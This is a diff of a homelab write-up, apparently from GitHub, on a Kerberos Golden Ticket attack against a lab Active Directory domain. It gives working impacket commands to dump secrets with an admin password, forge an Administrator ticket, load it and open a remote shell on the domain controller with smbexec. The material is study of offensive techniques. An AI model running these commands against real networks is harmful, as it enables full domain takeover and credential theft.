@@ -159,14 +159,23 @@ impacket-secretsdump homelab.local/administrator:AdminPassword@10.10.10.10
 - An example is `S-1-5-21-1234567890-1234567890-1234567890` but there is another number attached after the third `1234567890` in the above SID which we can drop because that states the account's individual RID which is part of the domain SID itself. We can now forge the ticket
 
 ```
-impacket-ticketer -aesKey  <krbtgt-NT-hash> -domain-sid <domain-SID> -domain homelab.local -user-id 500 fakeadmin
+impacket-ticketer -aesKey <aesKey> -domain-sid <domain-sid> -domain homelab.local -user-id 500 -groups 512,513,518,519,520 administrator
 ```
-- The ticket is forged and this creates a file called `fakeadmin.ccache`. Above, we knew the `nthash` from dumping which signs the fake ticket so the KDC accepts it as a legitimate ticket, `-user-id 500` tells us that the RID is 500 which is always the built in Administrator so this ticket has Administrator level rights and `fakeadmin` is a username which can be anything, even a real local domain user or the Administrator
+- The ticket is forged and this creates a file called `administrator.ccache`. Above, we knew the `aesKey` from dumping which signs the fake ticket so the KDC accepts it as a legitimate ticket, `-user-id 500` tells us that the RID is 500 which is always the built in Administrator so this ticket has Administrator level rights and `administrator` which is a real AD account
 <p align="center">
-<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/11ff8390-968c-4219-acae-a52896745dc0" />
+<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/8d83056b-3f9c-4e68-b0ad-7a99c21d062c" />
 </p>
 
 - We can load the forged ticket into our session where this tells Kereberos aware tools to use this ticket file for authentication instead of asking for a password
 ```
-export KRB5CCNAME=fakeadmin.ccache
+export KRB5CCNAME=administrator.ccache
 ```
+- and running it with gives us the shell
+```
+impacket-smbexec -k -no-pass homelab.local/administrator@dc01.homelab.local
+```
+<p align="center">
+<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/158feae8-7319-44df-9b2b-4ab2782b27c5" />
+</p>
+
+- Above, the golden ticket forges a Kerberos Ticket Granting Ticket (`TGT`) that allows an attacker to authenticate as a privileged user, such as a Domain Administrator. We used the tool `smbexec` where when it is executed, it presents the forged `TGT` to the Key Distribution Center (KDC), which issues a legitimate service ticket (`TGS`) for the target SMB (`CIFS`) service because the forged TGT appears valid. The tool then uses this TGS to authenticate to the SMB service on the target system. Since the impersonated account has administrative privileges, `smbexec` leverages built-in Windows administrative features, such as creating and starting a temporary service, to execute commands remotely and provide an interactive shell. Therefore, the Golden Ticket enables trusted authentication, while the shell is obtained through legitimate Windows remote administration mechanisms
